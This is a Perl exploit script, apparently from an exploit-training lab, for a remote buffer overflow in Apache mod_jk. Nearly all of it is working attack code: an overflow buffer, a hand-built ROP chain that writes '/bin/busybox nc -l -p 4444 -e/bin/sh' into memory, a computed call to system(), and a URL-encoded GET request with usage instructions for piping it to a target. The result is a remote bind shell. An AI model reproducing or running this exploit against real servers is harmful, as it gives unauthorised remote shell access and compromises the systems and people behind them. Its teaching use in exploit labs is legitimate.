#!/usr/bin/perl
# Remote Buffer Overflow in Apache mod_jk 
# The Exploit Laboratory - TINYSPLOIT2
#
# Usage: 
# perl modjk_exploit.pl | nc <ip> 80
#
# It will open a netcat listener on port 4444. 
#
# by Dobin Rutishauser


#!/usr/bin/perl

$| = 1;               # turn off output buffering


$buf = "A" x 4123; # Orig


# current
#
#
# httpd:
# 0x08060ab2: pop ebp; ret;

# rw:
# 	 0x8097000  0x809a000     0x3000        0x0

$ropchain = "";
$ropchain .= pack("V", 0x08060ab2);   # pop ebp
$ropchain .= pack("V", 0x8097010);    # point to null value
$ropchain .= pack("V", 0x08060ab2);   # pop ebp
$ropchain .= pack("V", 0x8097180);    # point to non-null value


$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x6e69622f);
$ropchain .= pack("V", 0x8097010);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x7375622f);
$ropchain .= pack("V", 0x8097014);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x786f6279);
$ropchain .= pack("V", 0x8097018);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x20636e20);
$ropchain .= pack("V", 0x809701c);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x2d206c2d);
$ropchain .= pack("V", 0x8097020);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x34342070);
$ropchain .= pack("V", 0x8097024);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x2d203434);
$ropchain .= pack("V", 0x8097028);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x69622f65);
$ropchain .= pack("V", 0x809702c);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x68732f6e);
$ropchain .= pack("V", 0x8097030);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);



# mov offset to edx
# offset -> esi
$ropchain .= pack("V", 0x08060b11); # 0x08060b11: pop esi; pop ebp; ret;
$ropchain .= pack("V", 0x76f468d1); # xored offset between malloc and system
$ropchain .= pack("V", 0x44444444);

# esi -> eax
$ropchain .= pack("V", 0x0806f527); # 0x0806f527: mov eax, esi; pop esi; pop ebp; ret;
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);

# xor eax
$ropchain .= pack("V", 0x08061233); # 0x08061233: xor eax, 0x89080891; ret;


# mov eax to edx
$ropchain .= pack("V", 0x08078b2f); # 0x08078b2f: mov edx, eax; mov eax, edx; pop ebp; ret;
$ropchain .= pack("V", 0x44444444);

# addr to esi
$ropchain .= pack("V", 0x08060b11); # 0x08060b11: pop esi; pop ebp; ret;
$ropchain .= pack("V", 0x0809461c-0x4); # addr of malloc
$ropchain .= pack("V", 0x44444444);

# esi to eax
$ropchain .= pack("V", 0x0806f527); # 0x0806f527: mov eax, esi; pop esi; pop ebp; ret;
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);

# add [eax+4] to edx
$ropchain .= pack("V", 0x080755e8); # 0x080755e8: add edx, dword ptr [eax + 4]; mov eax, edx; ret;

# call edx (or eax)
$ropchain .= pack("V", 0x08060a44); # 0x08060a44: call edx;
$ropchain .= pack("V", 0x8097010+0x68);

#$ropchain .= pack("V", 0x45454546);   #


$uri = $buf . $ropchain;

# URL Encode
$uri =~ s/([^A-Za-z0-9\/])/sprintf("%%%02X", ord($1))/seg;

$request = "GET /${uri} HTTP/1.0\n\n";
print $request;
